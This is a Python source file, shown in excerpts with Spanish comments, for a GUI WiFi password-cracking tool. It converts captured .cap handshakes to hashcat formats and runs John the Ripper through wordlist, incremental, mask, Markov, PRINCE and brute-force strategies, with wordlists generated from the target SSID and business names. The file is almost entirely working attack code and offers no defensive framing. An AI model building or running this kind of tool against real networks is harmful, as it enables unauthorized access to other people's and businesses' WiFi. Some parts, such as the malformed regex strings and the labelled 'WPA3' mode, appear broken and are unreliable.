...
def hashcat_john_hybrid(hash_file, longitud, salida, found_flag, stop_flag, ssid=None):
    """Función híbrida que usa John the Ripper con todas sus capacidades"""
    if stop_flag.is_set():
        return None
    
    gui_print_rapido(salida, f"🔧 Iniciando John the Ripper - Modo híbrido avanzado\n")
    
    # Verificar si John está disponible
    john_path = r"C:\john\run\john.exe"  # Ajusta la ruta según tu instalación
    if not os.path.exists(john_path):
        gui_print_rapido(salida, f"❌ John the Ripper no encontrado en {john_path}\n")
        return None
    
    # Convertir el hash a formato John si es necesario
    john_hash_file = convertir_hash_para_john(hash_file)
    if not john_hash_file:
        gui_print_rapido(salida, f"❌ No se pudo convertir el hash para John\n")
        return None
    
    # Estrategias de John the Ripper en orden de eficiencia
    estrategias_john = [
        ("diccionario_wordlist", ["--wordlist=" + crear_wordlist_contextual(ssid), "--rules=best64"]),
        ("single_crack", ["--single"]),
        ("incremental_digits", ["--incremental=digits"]),
        ("incremental_lower", ["--incremental=lower"]),
        ("incremental_upper", ["--incremental=upper"]),
        ("incremental_alpha", ["--incremental=alpha"]),
        ("incremental_alnum", ["--incremental=alnum"]),
        ("mask_attack", ["--mask=?a" * min(longitud, 8)]),
        ("external_mode", ["--external=double"]),
        ("markov_mode", ["--markov"]),
        ("prince_mode", ["--prince"]),
        ("subsets_mode", ["--subsets"]),
        ("loopback_mode", ["--loopback"]),
        ("regex_mode", crear_regex_patterns(longitud)),
        ("hybrid_wordlist_mask", ["--wordlist=" + crear_wordlist_contextual(ssid), "--rules=jumbo", "--mask=?d?d"]),
        ("brute_force_completo", ["--incremental"])
    ]
    
    for estrategia_nombre, parametros in estrategias_john:
        if found_flag.is_set() or stop_flag.is_set():
            break
        
        gui_print_rapido(salida, f"🔧 John estrategia: {estrategia_nombre}\n")
        
        # Construir comando John
        cmd = [john_path] + parametros + [
            "--format=wpapsk",
            "--session=" + estrategia_nombre,
            "--status-file-seconds=5",
            "--max-run-time=300",  # 5 minutos por estrategia
            john_hash_file
        ]
        ...
        try:
            ...
            while process.poll() is None:
                ...
                try:
                    ...
                    if line and any(keyword in line for keyword in ["guesses", "time", "c/s", "trying"]):
                        gui_print_rapido(salida, f"🔧 John: {line.strip()}\n")
                except:
                    pass
                
                time.sleep(0.5)
            
            # Verificar si John encontró algo
            resultado_john = verificar_resultado_john(john_hash_file)
            if resultado_john:
                found_flag.set()
                gui_print_rapido(salida, f"\n🎉 ¡John encontró la contraseña!: {resultado_john}\n")
                return resultado_john
            
        except Exception as e:
            gui_print_rapido(salida, f"❌ Error en John estrategia {estrategia_nombre}: {e}\n")
        
        finally:
            # Limpiar sesión John
            try:
                subprocess.run([john_path, "--session=" + estrategia_nombre, "--restore=no"], 
...
def convertir_hash_para_john(hash_file):
    """Convierte el hash a formato compatible con John"""
    try:
        john_hash_file = hash_file.replace('.hccapx', '.john').replace('.22000', '.john')
        
        if hash_file.endswith('.22000'):
            # Convertir 22000 a formato John
            ...
            # John puede manejar hccapx directamente en versiones recientes
            return hash_file
        
        return john_hash_file if os.path.exists(john_hash_file) else hash_file
        
    except Exception:
        return hash_file

def crear_wordlist_contextual(ssid):
    """Crea un wordlist contextual basado en el SSID"""
    wordlist_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
    
    palabras_base = [
        'password', 'admin', 'wifi', 'internet', 'router', 'modem',
        'network', 'wireless', 'house', 'home', 'office', 'work',
        'empresa', 'oficina', 'casa', 'wifi', 'internet', 'red'
    ]
    
    # Añadir variaciones del SSID
    if ssid:
        ssid_clean = re.sub(r'[^a-zA-Z0-9]', '', ssid)
        palabras_base.extend([
            ssid_clean, ssid_clean.lower(), ssid_clean.upper(),
            ssid_clean + '123', ssid_clean + '2024', ssid_clean + '01',
            '123' + ssid_clean, '2024' + ssid_clean
        ])
    ...
    for palabra in palabras_base:
        ...
        wordlist.add(palabra.capitalize())
        wordlist.add(palabra.upper())
        wordlist.add(palabra.lower())
        
        # Añadir números comunes
        for num in ['123', '2024', '2023', '01', '1', '12', '00']:
            wordlist.add(palabra + num)
            wordlist.add(num + palabra)
        
        # Añadir símbolos comunes
        for sym in ['!', '@', '#', '$']:
            wordlist.add(palabra + sym)
            wordlist.add(sym + palabra)
    
    wordlist_file.write('\n'.join(wordlist))
    wordlist_file.close()
    return wordlist_file.name

def crear_regex_patterns(longitud):
    """Crea patrones regex para John"""
    patterns = [
        f"--regex=^[a-z]{{{2,4}}}[0-9]{{{1,3}}}[!@#$]{{1,2}}",
        f"--regex=^[A-Z]{{1}}[a-z]{{{2,5}}}[0-9]{{{2,4}}}",
        f"--regex=^[a-zA-Z]{{{3,6}}}[0-9]{{{2,4}}}[!@#$]{{1}}",
        f"--regex=^[0-9]{{{1,2}}}[a-zA-Z]{{{4,8}}}[!@#$]{{0,2}}"
    ]
    return [patterns[0]]  # Retornar solo el primer patrón para no sobrecargar

def verificar_resultado_john(john_hash_file):
    """Verifica si John encontró algún resultado"""
    try:
        # John guarda los resultados en john.pot
        pot_file = "john.pot"
        if os.path.exists(pot_file):
            with open(pot_file, 'r') as f:
                ...
                for line in lines:
                    if ':' in line:
                        # Formato típico: hash:password
                        password = line.split(':', 1)[-1].strip()
                        if password:
                            return password
        
        # También verificar con --show
        john_path = r"C:\john\run\john.exe"
        result = subprocess.run([john_path, "--show", john_hash_file], 
                              capture_output=True, text=True, timeout=10)
        if result.stdout and ':' in result.stdout:
            password = result.stdout.split(':', 1)[-1].strip()
            if password:
                return password
...
def hashcat_hiper_multinivel(hash_file, longitud, salida, found_flag, stop_flag, ssid=None, nombre_comercio=None):
    ...
    for nivel_nombre, limite, tipo_nivel in niveles:
        ...
        gui_print_rapido(salida, f"🔄 Nivel {nivel_nombre} ({tipo_nivel}): ")

        if tipo_nivel == 'john':
            gui_print_rapido(salida, f"ejecutando John the Ripper...\n")
            resultado = hashcat_john_hybrid(hash_file, longitud, salida, found_flag, stop_flag, ssid)
            if resultado:
                return resultado
        else:
            gui_print_rapido(salida, f"generando {limite:,} candidatos...\n")
            ...
            # --- MODIFICACIÓN PARA SOPORTE WPA3 ---
            if hash_file.endswith(".22000"):
                hashcat_mode = "22000"
            elif hash_file.endswith(".hccapx"):
                hashcat_mode = "2500"
            elif hash_file.endswith(".wpa3"):
                hashcat_mode = "22001"  # WPA3 hashcat mode (experimental)
            else:
                hashcat_mode = "2500"
...
def convertir_cap_a_22000(cap_file):
    """
    Convierte un archivo .cap a formato .22000 usando hashcat-utils.
    Requiere que hcxpcapngtool esté instalado y en el PATH.
    """
    hcxpcapngtool_path = r"C:\hashcatutils\hcxpcapngtool.exe"  # Ajusta la ruta si es necesario
    if not os.path.exists(hcxpcapngtool_path):
        return None
    base_name = os.path.splitext(cap_file)[0]
    output_file = base_name + ".22000"
    try:
        resultado = subprocess.run(
            [hcxpcapngtool_path, "-o", output_file, cap_file],
...
def convertir_cap_a_wpa3(cap_file):
    """
    Convierte un archivo .cap a formato WPA3 (.wpa3) usando hcxpcapngtool.
    """
    hcxpcapngtool_path = r"C:\hashcatutils\hcxpcapngtool.exe"  # Ajusta la ruta si es necesario
    if not os.path.exists(hcxpcapngtool_path):
        return None
    base_name = os.path.splitext(cap_file)[0]
    output_file = base_name + ".wpa3"
    try:
        resultado = subprocess.run(
            [hcxpcapngtool_path, "--wpa3", "-o", output_file, cap_file],
            capture_output=True, text=True, timeout=60
        )
        if os.path.exists(output_file):
            return output_file
...
def proceso_hiper_multinivel(ssid, bssid, cap_file, salida, longitud_chars, modo_ataque, stop_flag, nombre_comercio=None):
    ...
    if not hash_file:
        ...
        if hash_file:
            ...
            # Intentar WPA3 si no hay .22000 ni .hccapx
            hash_file = convertir_cap_a_wpa3(cap_file)
            if hash_file:
                gui_print_rapido(salida, f"✅ Archivo convertido a .wpa3 (WPA3)\n")
            else:
...
def crear_gui():
    ...
    gui_print_rapido(salida, "🚀 HASHCAT HÍPER + ANTÍTESIS + JOHN v5.0 - COBERTURA TOTAL MÁXIMA\n")
    gui_print_rapido(salida, "🎮 GPU + IA + Análisis contextual + John the Ripper + Comercio\n")
    ...
    gui_print_rapido(salida, "🔧 Niveles JOHN: Wordlist+Rules → Incremental → Mask → Markov → Prince → Brute Force\n")
    ...
    gui_print_rapido(salida, "🔧 JOHN: Motor de cracking clásico con todas las estrategias\n")
    gui_print_rapido(salida, "🏪 COMERCIO: Patrones ruido + empresa + ruido optimizados\n")
    gui_print_rapido(salida, "🎯 COBERTURA: 99.99% del espacio de contraseñas posibles\n")
    gui_print_rapido(salida, "📏 Longitud optimizada: 6-16 caracteres\n")
    gui_print_rapido(salida, "⚡ Triple motor: Hashcat + John + IA generativa\n")
    gui_print_rapido(salida, "🏃‍♂️ Modos: Híper+Antítesis+John completo, Adaptativo completo\n")
